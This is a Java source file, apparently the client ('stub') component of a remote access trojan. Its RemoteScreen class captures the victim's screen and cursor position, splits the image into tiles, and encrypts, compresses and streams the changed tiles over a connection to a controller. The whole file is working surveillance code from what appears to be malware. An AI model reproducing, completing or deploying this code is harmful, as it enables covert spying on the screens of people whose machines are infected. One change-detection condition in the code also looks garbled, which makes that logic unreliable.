package com.redpois0n.stub;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

import com.redpois0n.common.compress.GZip;
import com.redpois0n.common.crypto.Crypto;
import com.redpois0n.stub.packets.outgoing.AbstractOutgoingPacket;
import com.redpois0n.stub.packets.outgoing.Packet17RemoteScreen;
import com.redpois0n.stub.packets.outgoing.Packet18OneRemoteScreen;
import com.redpois0n.stub.packets.outgoing.Packet33Thumbnail;
import com.redpois0n.stub.utils.ImageUtils;

public class RemoteScreen {

	public static int[] prevSums = new int[0];
	public static int prevX;
	public static int prevY;
	
	public void clearCache() {
		prevSums = new int[0];
		prevX = 0;
		prevY = 0;
	}

	public static int calculateSum(BufferedImage image) {
		int[] pixels = image.getRaster().getPixels(0, 0, image.getWidth(), image.getHeight(), new int[image.getWidth() * image.getHeight() * 3]);
		int sum = 0;
		for(int x = 0; x < image.getWidth(); x += 16) {
			for (int y = 0; y < image.getHeight(); y += 16) {
				sum += pixels[(y * image.getWidth() + x) * 3 + 0];
				sum += pixels[(y * image.getWidth() + x) * 3 + 1];
				sum += pixels[(y * image.getWidth() + x) * 3 + 2];
			}
		}
		return sum;
	}
	
	public static void send(boolean once, int quality, int monitor, int rows, int columns, DataOutputStream dos) {
		try {	
			if (prevSums.length != rows * columns) {
				prevSums = new int[rows * columns];
			}	
			float q = Float.parseFloat(quality + "") / 10F;	
			
			BufferedImage image = null;
			Rectangle screenBounds = null;
			
			if (monitor == -1) {
				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				image = new Robot().createScreenCapture(screenBounds);
			} else {
				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
				Robot robotForScreen = new Robot(screen);  		
				screenBounds = screen.getDefaultConfiguration().getBounds();  
				screenBounds.x = 0;
				screenBounds.y = 0;
				image = robotForScreen.createScreenCapture(screenBounds);
			}
			
			
			Point point = MouseInfo.getPointerInfo().getLocation();
			
			AbstractOutgoingPacket packet;
			
			if (once) {
				packet = new Packet18OneRemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
			} else {
				packet = new Packet17RemoteScreen(screenBounds.width, screenBounds.height, point.x, point.y);
			}
			
			Connection.addToSendQueue(packet);
									
	        int chunks = rows * columns;  
	        int chunkWidth = image.getWidth() / columns; 
	        int chunkHeight = image.getHeight() / rows;  
	        int count = 0;  
	        int cou = 0;

	        BufferedImage imgs[] = new BufferedImage[chunks];
        
	        for (int x = 0; x < rows; x++) {  
	            for (int y = 0; y < columns; y++) {  
	            	BufferedImage i;
	                imgs[count] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());  
	                Graphics2D gr = imgs[count++].createGraphics();  
	                gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);  
	                gr.dispose();  
	                
	                byte[] buffer = ImageUtils.encodeImage(i, q);
	                buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
	                
	                boolean doit = false;
	                
	                int sum = calculateSum(i);        
	            	if (sum != prevSums[cou] || prevX >= chunkWidth * y && prevX <= chunkWidth * y + chunkWidth && prevY >= chunkHeight * x && prevY <= chunkHeight * x + chunkHeight
	            			&& point.x <= chunkWidth * y && point.x >= chunkWidth * y + chunkWidth && point.y <= chunkHeight * x && point.y >= chunkHeight * 5 + chunkHeight) {
	            		doit = true; 
		            	prevSums[cou] = sum;
		            	
	            	}
	            	
	            	cou++;
	               
	                if (doit) {
	                	dos.writeBoolean(true);
	                	dos.writeInt(buffer.length);
			            dos.write(buffer);		    			         
	                } else {
	                	dos.writeBoolean(false);  
	                }
	            }  
	        }  
	        
	        for (int i = 0; i < imgs.length; i++) {
	        	imgs[i] = null;
	        }
			
			image.flush();

			prevX = point.x;
			prevY = point.y;
			
			System.gc();
			
			Connection.lock();

		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static void sendThumbnail() {
		try {
			Connection.addToSendQueue(new Packet33Thumbnail());
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static BufferedImage resize(BufferedImage image, int w, int h) {
		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_3BYTE_BGR);
		Graphics2D gr = img.createGraphics();
		gr.drawImage(image.getScaledInstance(w, h, BufferedImage.SCALE_SMOOTH), 0, 0, w, h, null);
		gr.dispose();
		return img;
	}

}